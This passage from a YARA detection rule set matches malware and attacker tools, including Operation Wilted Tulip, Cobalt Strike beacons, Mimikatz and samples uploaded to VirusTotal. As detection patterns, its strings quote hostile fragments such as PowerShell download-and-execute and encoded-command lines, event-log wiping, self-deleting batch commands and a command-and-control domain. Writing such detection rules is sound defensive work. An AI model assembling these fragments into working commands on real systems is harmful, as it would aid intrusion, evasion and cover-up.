      $x3 = "//Dump Chrome Passwords to a Output file \"c:\\passlist.txt\"" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them )
}

rule WiltedTulip_Tools_clrlg {
   meta:
      description = "Detects Windows eventlog cleaner used in Operation Wilted Tulip - file clrlg.bat"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23"
      hash1 = "b33fd3420bffa92cadbe90497b3036b5816f2157100bf1d9a3b6c946108148bf"
   strings:
      $s1 = "('wevtutil.exe el') DO (call :do_clear" fullword ascii
      $s2 = "wevtutil.exe cl %1" fullword ascii
   condition:
      filesize < 1KB and 1 of them
}

rule WiltedTulip_powershell {
   meta:
      description = "Detects powershell script used in Operation Wilted Tulip"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23"
      hash1 = "e5ee1f45cbfdb54b02180e158c3c1f080d89bce6a7d1fe99dd0ff09d47a36787"
   strings:
      $x1 = "powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+" ascii
   condition:
      1 of them
}

rule WiltedTulip_vminst {
   meta:
      description = "Detects malware used in Operation Wilted Tulip"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23"
      hash1 = "930118fdf1e6fbffff579e65e1810c8d91d4067cbbce798c5401cf05d7b4c911"
   strings:
      $x1 = "\\C++\\Trojan\\Target\\" ascii

      $s1 = "%s\\system32\\rundll32.exe" fullword wide
      $s2 = "$C:\\Windows\\temp\\l.tmp" fullword wide
      $s3 = "%s\\svchost.exe" fullword wide
      $s4 = "args[10] is %S and command is %S" fullword ascii
      $s5 = "LOGON USER FAILD " fullword ascii
      $s6 = "vminst.tmp" fullword wide
      $s7 = "operator co_await" fullword ascii
      $s8 = "?ReflectiveLoader@@YGKPAX@Z" fullword ascii
      $s9 = "%s -k %s" fullword wide
      $s10 = "ERROR in %S/%d" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and (
         1 of ($x*) or 5 of ($s*)
      )
}

rule WiltedTulip_Windows_UM_Task {
   meta:
      description = "Detects a Windows scheduled task as used in Operation Wilted Tulip"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23"
      hash1 = "4c2fc21a4aab7686877ddd35d74a917f6156e48117920d45a3d2f21fb74fedd3"
   strings:
      $r1 = "<Command>C:\\Windows\\syswow64\\rundll32.exe</Command>" fullword wide
      $p1 = "<Arguments>\"C:\\Users\\public\\" wide
      $c1 = "svchost64.swp\",checkUpdate" wide ascii
      $c2 = "svchost64.swp,checkUpdate" wide ascii
   condition:
      ( $r1 and $p1 ) or
      1 of ($c*)
}

rule WiltedTulip_WindowsTask {
   meta:
      description = "Detects hack tool used in Operation Wilted Tulip - Windows Tasks"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23"
      hash1 = "c3cbe88b82cd0ea46868fb4f2e8ed226f3419fc6d4d6b5f7561e70f4cd33822c"
      hash2 = "340cbbffbb7685133fc318fa20e4620ddf15e56c0e65d4cf1b2d606790d4425d"
      hash3 = "b6f515b3f713b70b808fc6578232901ffdeadeb419c9c4219fbfba417bba9f01"
      hash4 = "5046e7c28f5f2781ed7a63b0871f4a2b3065b70d62de7254491339e8fe2fa14a"
      hash5 = "984c7e1f76c21daf214b3f7e131ceb60c14abf1b0f4066eae563e9c184372a34"
   strings:
      $x1 = "<Command>C:\\Windows\\svchost.exe</Command>" fullword wide
      $x2 = "<Arguments>-nop -w hidden -encodedcommand" wide
      $x3 = "-encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA"
   condition:
      1 of them
}

rule WiltedTulip_tdtess {
   meta:
      description = "Detects malicious service used in Operation Wilted Tulip"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23"
      hash1 = "3fd28b9d1f26bd0cee16a167184c9f4a22fd829454fd89349f2962548f70dc34"
   strings:
      $x1 = "d2lubG9naW4k" fullword wide /* base64 encoded string 'winlogin$' */
      $x2 = "C:\\Users\\admin\\Documents\\visual studio 2015\\Projects\\Export\\TDTESS_ShortOne\\WinService Template\\" ascii

      $s1 = "\\WinService Template\\obj\\x64\\x64\\winlogin" ascii
      $s2 = "winlogin.exe" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and ( 1 of ($x*) or 2 of them ) )
}

rule WiltedTulip_SilverlightMSI {
   meta:
      description = "Detects powershell tool call Get_AD_Users_Logon_History used in Operation Wilted Tulip"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23"
      hash1 = "c75906dbc3078ff81092f6a799c31afc79b1dece29db696b2ecf27951a86a1b2"
   strings:
      $x1 = ".\\Get_AD_Users_Logon_History.ps1 -MaxEvent" fullword ascii
      $x2 = "if ((Resolve-dnsname $_.\"IP Address\" -Type PTR -TcpOnly -DnsOnly -ErrorAction \"SilentlyContinue\").Type -eq \"PTR\")" fullword ascii
      $x3 = "$Client_Name = (Resolve-dnsname $_.\"IP Address\" -Type PTR -TcpOnly -DnsOnly).NameHost  " fullword ascii
      $x4 = "########## Find the Computer account in AD and if not found, throw an exception ###########" fullword ascii
   condition:
      ( filesize < 20KB and 1 of them )
}

rule WiltedTulip_matryoshka_Injector {
   meta:
      description = "Detects hack tool used in Operation Wilted Tulip"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23"
      hash1 = "c41e97b3b22a3f0264f10af2e71e3db44e53c6633d0d690ac4d2f8f5005708ed"
      hash2 = "b93b5d6716a4f8eee450d9f374d0294d1800784bc99c6934246570e4baffe509"
   strings:
      $s1 = "Injector.dll" fullword ascii
      $s2 = "ReflectiveLoader" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and all of them ) or
      (
        pe.exports("__dec") and
        pe.exports("_check") and
        pe.exports("_dec") and
        pe.exports("start") and
        pe.exports("test")
      )
}

rule WiltedTulip_Zpp {
   meta:
      description = "Detects hack tool used in Operation Wilted Tulip"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23"
      hash1 = "10ec585dc1304436821a11e35473c0710e844ba18727b302c6bd7f8ebac574bb"
      hash2 = "7d046a3ed15035ea197235980a72d133863c372cc27545af652e1b2389c23918"
      hash3 = "6d6816e0b9c24e904bc7c5fea5951d53465c478cc159ab900d975baf8a0921cf"
   strings:
      $x1 = "[ERROR] Error Main -i -s -d -gt -lt -mb" fullword wide
      $x2 = "[ERROR] Error Main -i(with.) -s -d -gt -lt -mb -o -e" fullword wide

      $s1 = "LT Time invalid" fullword wide
      $s2 = "doCompressInNetWorkDirectory" fullword ascii
      $s3 = "files remaining ,total file save = " fullword wide
      $s4 = "$ec996350-79a4-477b-87ae-2d5b9dbe20fd" fullword ascii
      $s5 = "Destinition Directory Not Found" fullword wide
      $s6 = "\\obj\\Release\\ZPP.pdb" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 30KB and ( 1 of ($x*) or 3 of them )
}

rule WiltedTulip_Netsrv_netsrvs {
   meta:
      description = "Detects sample from Operation Wilted Tulip"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23"
      hash1 = "a062cb4364125427b54375d51e9e9afb0baeb09b05a600937f70c9d6d365f4e5"
      hash2 = "afa563221aac89f96c383f9f9f4ef81d82c69419f124a80b7f4a8c437d83ce77"
      hash3 = "acf24620e544f79e55fd8ae6022e040257b60b33cf474c37f2877c39fbf2308a"
      hash4 = "bff115d5fb4fd8a395d158fb18175d1d183c8869d54624c706ee48a1180b2361"
      hash5 = "07ab795eeb16421a50c36257e6e703188a0fef9ed87647e588d0cd2fcf56fe43"
   strings:
      $s1 = "Process %d Created" fullword ascii
      $s2 = "%s\\system32\\rundll32.exe" fullword wide
      $s3 = "%s\\SysWOW64\\rundll32.exe" fullword wide

      $c1 = "slbhttps" fullword ascii
      $c2 = "/slbhttps" fullword wide
      $c3 = "/slbdnsk1" fullword wide
      $c4 = "netsrv" fullword wide
      $c5 = "/slbhttps" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( all of ($s*) and 1 of ($c*) ) )
}

rule WiltedTulip_ReflectiveLoader {
   meta:
      description = "Detects reflective loader (Cobalt Strike) used in Operation Wilted Tulip"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23"
      hash1 = "1097bf8f5b832b54c81c1708327a54a88ca09f7bdab4571f1a335cc26bbd7904"
      hash2 = "1f52d643e8e633026db73db55eb1848580de00a203ee46263418f02c6bdb8c7a"
      hash3 = "a159a9bfb938de686f6aced37a2f7fa62d6ff5e702586448884b70804882b32f"
      hash4 = "cf7c754ceece984e6fa0d799677f50d93133db609772c7a2226e7746e6d046f0"
      hash5 = "eee430003e7d59a431d1a60d45e823d4afb0d69262cc5e0c79f345aa37333a89"
   strings:
      $x1 = "powershell -nop -exec bypass -EncodedCommand \"%s\"" fullword ascii
      $x2 = "%d is an x86 process (can't inject x64 content)" fullword ascii
      $x3 = "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s" fullword ascii
      $x4 = "Failed to impersonate token from %d (%u)" fullword ascii
      $x5 = "Failed to impersonate logged on user %d (%u)" fullword ascii
      $x6 = "%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and 1 of them ) or
      ( 2 of them ) or
      pe.exports("_ReflectiveLoader@4")
}

rule WiltedTulip_Matryoshka_RAT {
   meta:
      description = "Detects Matryoshka RAT used in Operation Wilted Tulip"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23"
      hash1 = "6f208473df0d31987a4999eeea04d24b069fdb6a8245150aa91dfdc063cd64ab"
      hash2 = "6cc1f4ecd28b833c978c8e21a20a002459b4a6c21a4fbaad637111aa9d5b1a32"
   strings:
      $s1 = "%S:\\Users\\public" fullword wide
      $s2 = "ntuser.dat.swp" fullword wide
      $s3 = "Job Save / Load Config" fullword wide
      $s4 = ".?AVPSCL_CLASS_JOB_SAVE_CONFIG@@" fullword ascii
      $s5 = "winupdate64.com" fullword ascii
      $s6 = "Job Save KeyLogger" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and 3 of them )
}

/* Malware ----------------------------------------------------------------- */

rule TrojanDownloader {
	meta:
		description = "Trojan Downloader - Flash Exploit Feb15"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "http://goo.gl/wJ8V1I"
		date = "2015/02/11"
		hash = "5b8d4280ff6fc9c8e1b9593cbaeb04a29e64a81e"
		score = 60
	strings:
		$x1 = "Hello World!" fullword ascii
		$x2 = "CONIN$" fullword ascii

		$s6 = "GetCommandLineA" fullword ascii
		$s7 = "ExitProcess" fullword ascii
		$s8 = "CreateFileA" fullword ascii

		$s5 = "SetConsoleMode" fullword ascii
		$s9 = "TerminateProcess" fullword ascii
		$s10 = "GetCurrentProcess" fullword ascii
		$s11 = "UnhandledExceptionFilter" fullword ascii
		$s3 = "user32.dll" fullword ascii
		$s16 = "GetEnvironmentStrings" fullword ascii
		$s2 = "GetLastActivePopup" fullword ascii
		$s17 = "GetFileType" fullword ascii
		$s19 = "HeapCreate" fullword ascii
		$s20 = "VirtualFree" fullword ascii
		$s21 = "WriteFile" fullword ascii
		$s22 = "GetOEMCP" fullword ascii
		$s23 = "VirtualAlloc" fullword ascii
		$s24 = "GetProcAddress" fullword ascii
		$s26 = "FlushFileBuffers" fullword ascii
		$s27 = "SetStdHandle" fullword ascii
		$s28 = "KERNEL32.dll" fullword ascii
	condition:
		$x1 and $x2 and ( all of ($s*) ) and filesize < 35000
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-08-01
   Identifier: IsmDoor
   Reference: https://twitter.com/Voulnet/status/892104753295110145
   License: http://creativecommons.org/licenses/by-nc-sa/4.0/
*/

/* Rule Set ----------------------------------------------------------------- */

rule IsmDoor_Jul17_A2 {
   meta:
      description = "Detects IsmDoor Malware"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://twitter.com/Voulnet/status/892104753295110145"
      date = "2017-08-01"
      hash1 = "be72c89efef5e59c4f815d2fce0da5a6fac8c90b86ee0e424868d4ae5e550a59"
      hash2 = "ea1be14eb474c9f70e498c764aaafc8b34173c80cac9a8b89156e9390bd87ba8"
   strings:
      $s1 = "powershell -exec bypass -file \"" fullword ascii
      $s2 = "PAQlFcaWUaFkVICEx2CkNCUUpGcA" ascii
      $s3 = "\\Documents" fullword ascii
      $s4 = "\\Libraries" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 3 of them )
}

rule Unknown_Malware_Sample_Jul17_2 {
   meta:
      description = "Detects unknown malware sample with pastebin RAW URL"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://goo.gl/iqH8CK"
      date = "2017-08-01"
      hash1 = "3530d480db082af1823a7eb236203aca24dc3685f08c301466909f0794508a52"
   strings:
      $s1 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii
      $s2 = "https://pastebin.com/raw/" wide
      $s3 = "My.Computer" fullword ascii
      $s4 = "MyTemplate" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule MAL_unspecified_Jan18_1 {
   meta:
      description = "Detects unspecified malware sample"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-01-19"
      hash1 = "f87879b29ff83616e9c9044bd5fb847cf5d2efdd2f01fc284d1a6ce7d464a417"
   strings:
      $s1 = "User-Agent: Mozilla/4.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" fullword ascii
      $s2 = "ping 192.0.2.2 -n 1 -w %d >nul 2>&1" fullword ascii
      $s3 = "[Log Started] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]" fullword ascii
      $s4 = "start /b \"\" cmd /c del \"%%~f0\"&exit /b" fullword ascii
      $s5 = "[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]" fullword ascii
      $s6 = "%s\\%s.bat" fullword ascii
      $s7 = "DEL /s \"%s\" >nul 2>&1" fullword ascii
   condition:
      filesize < 300KB and 2 of them
}

rule Cloaked_as_JPG {
   meta:
      description = "Detects a cloaked file as JPG"
      author = "Florian Roth (eval section from Didier Stevens)"
      date = "2015-02-28"
      score = 40
   strings:
      $fp1 = "<!DOCTYPE" ascii
   condition:
      uint16be(0x00) != 0xFFD8 and
      not uint32be(0) == 0x47494638 and uint8(4) == 0x39 and /* GIF89 Header */
      /* and
      not filepath contains "ASP.NET" */
      not $fp1 in (0..30) and
      not uint32be(0) == 0x89504E47 and /* PNG Header */
      not uint16be(0) == 0x8b1f /* GZIP */
}

/*
    Yara Rule Set
    Author: Florian Roth
    Date: 2015-12-21
    Identifier: Uncommon File Sizes
*/

rule Suspicious_Size_explorer_exe {
    meta:
        description = "Detects uncommon file size of explorer.exe"
        license = "https://creativecommons.org/licenses/by-nc/4.0/"
        author = "Florian Roth"
        score = 60
        date = "2015-12-21"
        noarchivescan = 1
    condition:
        uint16(0) == 0x5a4d
		and ( filesize < 800KB or filesize > 5000KB )
}

rule Suspicious_Size_chrome_exe {
    meta:
        description = "Detects uncommon file size of chrome.exe"
        license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
        score = 60
        date = "2015-12-21"
        noarchivescan = 1
    condition:
        uint16(0) == 0x5a4d
          and ( filesize < 500KB or filesize > 2000KB )
}

rule Suspicious_Size_csrss_exe {
    meta:
        description = "Detects uncommon file size of csrss.exe"
        license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
        score = 60
        date = "2015-12-21"
        noarchivescan = 1
    condition:
        uint16(0) == 0x5a4d
         and ( filesize > 18KB )
}

rule Suspicious_Size_iexplore_exe {
    meta:
        description = "Detects uncommon file size of iexplore.exe"
        license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
        score = 60
        date = "2015-12-21"
        noarchivescan = 1
    condition:
        uint16(0) == 0x5a4d
        and ( filesize < 75KB or filesize > 910KB )
}

rule Suspicious_Size_firefox_exe {
    meta:
        description = "Detects uncommon file size of firefox.exe"
        license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
        score = 60
        date = "2015-12-21"
        noarchivescan = 1
    condition:
        uint16(0) == 0x5a4d
        and ( filesize < 265KB or filesize > 910KB )
}

rule Suspicious_Size_java_exe {
    meta:
        description = "Detects uncommon file size of java.exe"
        license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
        score = 60
        date = "2015-12-21"
        noarchivescan = 1
    condition:
        uint16(0) == 0x5a4d
        and ( filesize < 42KB or filesize > 900KB )
}

rule Suspicious_Size_lsass_exe {
    meta:
        description = "Detects uncommon file size of lsass.exe"
        license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
        score = 60
        date = "2015-12-21"
        noarchivescan = 1
    condition:
        uint16(0) == 0x5a4d
        and ( filesize < 10KB or filesize > 100KB )
}

rule Suspicious_Size_svchost_exe {
    meta:
        description = "Detects uncommon file size of svchost.exe"
        license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
        score = 60
        date = "2015-12-21"
        noarchivescan = 1
    condition:
        uint16(0) == 0x5a4d
        
        and ( filesize < 14KB or filesize > 100KB )
}
	
/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-07-19
	Identifier: Invoke-Mimikatz
*/

/* Rule Set ----------------------------------------------------------------- */

rule Invoke_Mimikatz {
	meta:
		description = "Detects Invoke-Mimikatz String"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz"
		date = "2016-08-03"
		hash1 = "f1a499c23305684b9b1310760b19885a472374a286e2f371596ab66b77f6ab67"
	strings:
		$x2 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm" ascii
      $x3 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp" fullword ascii
	condition:
      1 of them
}

rule Invoke_PSImage {
   meta:
      description = "Detects a command to execute PowerShell from String"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/peewpw/Invoke-PSImage"
      date = "2017-12-16"
   strings:
      $ = "IEX([System.Text.Encoding]::ASCII.GetString(" ascii wide
      $ = "System.Drawing.Bitmap((a Net.WebClient).OpenRead(" ascii wide

      $ = { 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52
            00 00 04 E4 00 00 03 A0 08 06 00 00 00 9D AF A9
            E8 00 00 00 09 70 48 59 73 00 00 19 D6 00 00 19
            D6 01 18 D1 CA ED 00 00 00 07 74 49 4D 45 07 E1
            0C 0F 13 1E 36 89 C4 28 BF 00 00 00 07 74 45 58
            74 41 75 74 68 6F 72 00 A9 AE CC 48 00 00 00 0C
            74 45 58 74 44 65 73 63 72 69 70 74 69 6F 6E 00
            13 09 21 23 00 00 00 0A 74 45 58 74 43 6F 70 79
            72 69 67 68 74 00 AC 0F CC 3A 00 00 00 0E 74 45
            58 74 43 72 65 61 74 69 6F 6E 20 74 69 6D 65 00
            35 F7 0F }
   condition:
      filesize < 3000KB and 1 of them
}

rule Malware_JS_powershell_obfuscated {
   meta:
      description = "Unspecified malware - file rechnung_3.js"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-24"
      hash1 = "3af15a2d60f946e0c4338c84bd39880652f676dc884057a96a10d7f802215760"
   strings:
      $x1 = "po\" + \"wer\" + \"sh\" + \"e\" + \"ll\";" fullword ascii
   condition:
      filesize < 30KB and 1 of them
}
rule SUSP_Macro_StarOffice {
   meta:
        description = "Suspicious macro in StarOffice"
        author = "John Lambert @JohnLaTwC"
        date = "2019-02-06"
        score = 60
        reference = "https://twitter.com/JohnLaTwC/status/1093259873993732096"
        hash1 = "8495d37825dab8744f7d2c8049fc6b70b1777b9184f0abe69ce314795480ce39"
        hash2 = "25b4214da1189fd30d3de7c538aa8b606f22c79e50444e5733fb1c6d23d71fbe"
        hash3 = "322f314102f67a16587ab48a0f75dfaf27e4b044ffdc3b88578351c05b4f39db"
        hash4 = "705429725437f7e0087a6159708df97992abaadff0fa48fdf25111d34a3e2f20"
        hash5 = "7141d94e827d3b24810813d6b2e3fb851da0ee2958ef347154bc28153b23874a"
        hash6 = "7c0e85c0a4d96080ca341d3496743f0f113b17613660812d40413be6d453eab4"
        hash7 = "8d59f1e2abcab9efb7f833d478d1d1390e7456092f858b656ee0024daf3d1aa3"
        hash8 = "9846b942d9d1e276c95361180e9326593ea46d3abcce9c116c204954bbfe3fdc"
        hash9 = "aa0c83f339c8c16ad21dec41e4605d4e327adbbb78827dcad250ed64d2ceef1c"
        hash10 = "b0be54c7210b06e60112a119c235e23c9edbe40b1c1ce1877534234f82b6b302"
        hash11 = "bf581ebb96b8ca4f254ab4d200f9a053aff8187715573d9a1cbd443df0f554e3"
        hash12 = "de45634064af31cb6768e4912cac284a76a6e66d398993df1aeee8ce26e0733b"

    strings:
        $r1 = "StarBasic"
        $r2 = "</script:module>"
        $s1 = "Shell" nocase
        $s2 = ".Run" nocase
        $s3 = ".PutInClipboard" nocase
        $s4 = "powershell" nocase
    condition:
        filesize < 1MB
        and uint32be(0) == 0x3c3f786d // <?xm
        and all of ($r*)
        and 1 of ($s*)
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-08-29
	Identifier: VT Research QA Malware
*/

/* Rule Set ----------------------------------------------------------------- */

/* Rules that can be used in any tool with YARA support */

rule Malware_QA_not_copy {
	meta:
		description = "VT Research QA uploaded malware - file not copy.exe"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "VT Research QA"
		date = "2016-08-29"
		score = 80
		hash1 = "1410f38498567b64a4b984c69fe4f2859421e4ac598b9750d8f703f1d209f836"
	strings:
		$x1 = "U2VydmVyLmV4ZQ==" fullword wide /* base64 encoded string 'Server.exe' */
		$x2 = "\\not copy\\obj\\Debug\\not copy.pdb" ascii
		$x3 = "fuckyou888.ddns.net" fullword wide

		$s1 = "cmd.exe /c ping 0 -n 2 & del \"" fullword wide
		$s2 = "Server.exe" fullword wide
		$s3 = "Execute ERROR" fullword wide
		$s4 = "not copy.exe" fullword wide
		$s5 = "Non HosT" fullword wide
		$s6 = "netsh firewall delete allowedprogram" fullword wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 1000KB and ( 1 of ($x*) or 4 of ($s*) ) )
		or ( 5 of them )
}

rule Malware_QA_update {
	meta:
		description = "VT Research QA uploaded malware - file update.exe"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "VT Research QA"
		date = "2016-08-29"
		score = 80
		hash1 = "6d805533623d7063241620eec38b7eb9b625533ccadeaf4f6c2cc6db32711541"
		hash2 = "6415b45f5bae6429dd5d92d6cae46e8a704873b7090853e68e80cd179058903e"
	strings:
		$x1 = "UnActiveOfflineKeylogger" fullword ascii
		$x2 = "BTRESULTDownload File|Mass Download : File Downloaded , Executing new one in temp dir...|" fullword ascii
		$x3 = "ActiveOnlineKeylogger" fullword ascii
		$x4 = "C:\\Users\\DarkCoderSc\\" ascii
		$x5 = "Celesty Binder\\Stub\\STATIC\\Stub.pdb" ascii
		$x6 = "BTRESULTUpdate from URL|Update : File Downloaded , Executing new one in temp dir...|" fullword ascii

		$s1 = "MSRSAAP.EXE" fullword wide
		$s2 = "Command successfully executed!|" fullword ascii
		$s3 = "BTMemoryLoadLibary: Get DLLEntyPoint failed" fullword ascii
		$s4 = "I wasn't able to open the hosts file, maybe because UAC is enabled in remote computer!" fullword ascii
		$s5 = "\\Internet Explorer\\iexplore.exe" fullword ascii
		$s6 = "ping 127.0.0.1 -n 4 > NUL && \"" fullword ascii
		$s7 = "BTMemoryGetProcAddress: DLL doesn't export anything" fullword ascii
		$s8 = "POST /index.php/1.0" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 3000KB and ( 1 of ($x*) or 3 of ($s*) ) )
		or ( all of them )
}

rule Malware_QA_tls {
	meta:
		description = "VT Research QA uploaded malware - file tls.exe"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "VT Research QA"
		date = "2016-08-29"
		score = 80
		hash1 = "f06d1f2bee2eb6590afbfa7f011ceba9bd91ba31cdc721bc728e13b547ac9370"
	strings:
		$s1 = "\\funoverip\\ultimate-payload-template1\\" ascii
		$s2 = "ULTIMATEPAYLOADTEMPLATE1" fullword wide
		$s3 = "ultimate-payload-template1" fullword wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them ) or ( all of them )
}

rule Malware_QA_get_The_FucKinG_IP {
	meta:
		description = "VT Research QA uploaded malware - file get The FucKinG IP.exe"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "VT Research QA"
		date = "2016-08-29"
		score = 80
		hash1 = "7b2c04e384919075be96e3412d92c14fc1165d1bc7556fd207488959c5c4d2f7"
	strings:
		$x1 = "C:\\Users\\Mdram ahmed\\AppData"
		$x2 = "\\Local\\Temporary Projects\\get The FucKinG IP\\" ascii
		$x3 = "get The FucKinG IP.exe" fullword wide
		$x4 = "get ip by mdr3m" fullword wide
		$x5 = "MDR3M kik: Mdr3mhm" fullword wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of ($x*) ) or ( 2 of them )
}

rule Malware_QA_vqgk {
	meta:
		description = "VT Research QA uploaded malware - file vqgk.dll"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "VT Research QA"
		date = "2016-08-29"
		score = 80
		hash1 = "99541ab28fc3328e25723607df4b0d9ea0a1af31b58e2da07eff9f15c4e6565c"
	strings:
		$x1 = "Z:\\devcenter\\aggressor\\external" ascii
		$x2 = "\\beacon\\Release\\beacon.pdb" fullword ascii
		$x3 = "%d is an x86 process (can't inject x64 content)" fullword ascii
		$x4 = "%d is an x64 process (can't inject x86 content)" fullword ascii

		$s1 = "powershell -nop -exec bypass -EncodedCommand \"%s\"" fullword ascii
		$s2 = "Could not open process token: %d (%u)" fullword ascii
		$s3 = "\\\\%s\\pipe\\msagent_%x" fullword ascii
		$s4 = "\\sysnative\\rundll32.exe" fullword ascii
		$s5 = "Failed to impersonate logged on user %d (%u)" fullword ascii
		$s6 = "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s" fullword ascii
		$s7 = "could not write to process memory: %d" fullword ascii
		$s8 = "beacon.dll" fullword ascii
		$s9 = "Failed to impersonate token from %d (%u)" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 600KB and ( 1 of ($x*) or 5 of ($s*) ) ) or ( 7 of them )
}

rule Malware_QA_1177 {
	meta:
		description = "VT Research QA uploaded malware - file 1177.vbs"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "VT Research QA"
		date = "2016-08-29"
		score = 80
		hash1 = "ff3a2740330a6cbae7888e7066942b53015728c367cf9725e840af5b2a3fa247"
	strings:
		$x1 = ".specialfolders (\"startup\") & \"\\ServerName.EXE\"" fullword ascii
		$x2 = "expandenvironmentstrings(\"%%InsallDir%%\") " ascii

		$s1 = "CreateObject(\"WScript.Shell\").Run(" ascii
		$s2 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAA" ascii
		$s3 = "cial Thank's to Dev-point.com" fullword ascii
		$s4 = ".createElement(\"tmp\")" fullword ascii
		$s5 = "'%CopyToStartUp%" fullword ascii
	condition:
		( uint16(0) == 0x4d27 and filesize < 100KB and ( 1 of ($x*) or 4 of ($s*) ) )
		or ( 5 of them )
}

/* Various rules - see the references */

rule PS_AMSI_Bypass {
   meta:
      description = "Detects PowerShell AMSI Bypass"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://gist.github.com/mattifestation/46d6a2ebb4a1f4f0e7229503dc012ef1"
